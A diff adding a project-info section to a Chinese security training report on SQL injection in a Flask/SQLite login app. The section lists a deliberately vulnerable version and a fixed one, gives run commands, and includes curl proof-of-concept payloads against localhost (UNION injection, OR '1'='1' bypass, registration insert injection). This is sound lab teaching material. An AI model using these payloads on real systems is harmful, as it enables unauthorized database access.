@@ -734,5 +734,62 @@ Layer 1: 参数化查询 (核心防线)
 
 ---
 
+## 九、项目信息
+
+### 9.1 项目地址
+
+本项目完整代码（漏洞版 + 修复版）及本报告均存放在 GitHub 仓库：
+
+👉 **https://github.com/lulu-xuan/security-training**
+
+### 9.2 目录结构
+
+```
+security-training/
+├── app/ + report/                      # Day2: 用户登录平台11项漏洞修复
+├── day3-app/                           # Day3: SQL注入漏洞版 + 修复版代码
+│   ├── app.py                          # ⚠️ 漏洞版（f-string拼接SQL）
+│   ├── app_fixed.py                    # ✅ 修复版（参数化查询）
+│   ├── data/users.db                   # SQLite数据库
+│   └── templates/                      # 模板文件（漏洞版+修复版）
+├── day3-report/
+│   └── sql_injection_report.md         # 📄 本报告
+└── README.md                           # 项目总导航
+```
+
+### 9.3 快速运行
+
+```bash
+# 克隆项目
+git clone git@github.com:lulu-xuan/security-training.git
+cd security-training
+
+# Day3 漏洞版运行
+cd day3-app && rm -f data/users.db && python3 app.py
+
+# Day3 修复版运行
+cd day3-app && rm -f data/users.db && python3 app_fixed.py
+```
+
+### 9.4 POC 测试速查
+
+```bash
+# 1. 登录获取 session
+curl http://127.0.0.1:5000/login -d "username=admin&password=admin123" -c /tmp/c.txt
+
+# 2. UNION注入 (5列)
+curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj_pass%27,%27inj@x.com%27,%27138%27--" -b /tmp/c.txt
+
+# 3. OR万能条件
+curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271" -b /tmp/c.txt
+
+# 4. 注册注入
+curl http://127.0.0.1:5000/register -d "username=hack5', 'pass5', 'h5@x.com', '555')--&password=x"
+curl http://127.0.0.1:5000/login -d "username=hack5&password=pass5"
+```
+
+---
+
 *报告生成日期：2026-07-19 | 实训项目：Day3 — SQL注入漏洞分析与修复*
 *平台：用户登录管理平台 | 技术栈：Flask 3.x + SQLite*
+*项目仓库：[github.com/lulu-xuan/security-training](https://github.com/lulu-xuan/security-training)*
